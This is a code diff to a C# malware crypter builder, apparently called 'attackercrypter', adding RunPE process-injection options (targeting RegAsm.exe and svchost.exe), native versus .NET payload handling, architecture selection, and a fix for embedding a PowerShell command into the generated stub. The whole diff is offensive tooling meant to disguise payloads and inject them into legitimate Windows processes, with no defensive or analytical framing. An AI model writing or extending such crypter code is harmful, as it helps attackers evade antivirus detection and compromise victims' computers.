@@ -28,7 +28,8 @@ namespace attackercrypter
         {
             InitializeComponent();
             Injection.SelectedItem = "AssemblyLoad(.Net)";
-            injectionpath.SelectedItem = "RegAsm.exe";
+            Netinjectionpath.SelectedItem = "RegAsm.exe";
+            nativeinjection.SelectedItem = "svchost.exe";
             
         }
 
@@ -143,8 +144,17 @@ namespace attackercrypter
             {
                 MessageBox.Show("Enter URL");
             }
-           
-            
+            else if(isNative.Checked == false && isNet.Checked == false)
+            {
+                MessageBox.Show("Choose if your payload Native or .NET -_-");
+            }
+            else if(radio32.Checked == false && radio64.Checked == false)
+            {
+                MessageBox.Show("Choose if it x64 or x32 -_-");
+
+            }
+
+
 
             else
             {
@@ -206,7 +216,7 @@ namespace attackercrypter
 
                 }
 
-                if (powershell.Enabled == true)
+                if (powershell.Checked == true)
                 {
                     Source = Source.Replace("public static bool ispwcommand = false;", "public static bool ispwcommand = true;");
                     byte[] bytes = System.Text.Encoding.Unicode.GetBytes(powershellcommand.Text);
@@ -231,7 +241,21 @@ namespace attackercrypter
                 }
                 else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == true)
                 {
-                    Source = Source.Replace("#INJECTPATH", injectionpath.SelectedItem.ToString());
+         
+                    if (isNet.Checked == true)
+                    {
+                        Source = Source.Replace("public static bool isNet = false;", "public static bool isNet = true;");
+                        Source = Source.Replace("#DOTNETINJECTPATH", Netinjectionpath.SelectedItem.ToString());
+
+                    }
+                    else if(isNative.Checked == true)
+                    {
+                        Source = Source.Replace("public static bool isNative = false;", "public static bool isNative = true;");
+
+                        Source = Source.Replace("#NATIVEINJECTPATH", nativeinjection.SelectedItem.ToString());
+
+                    }
+
                 }
 
                 if (runpecheck.Checked == true && radio64.Checked == true)
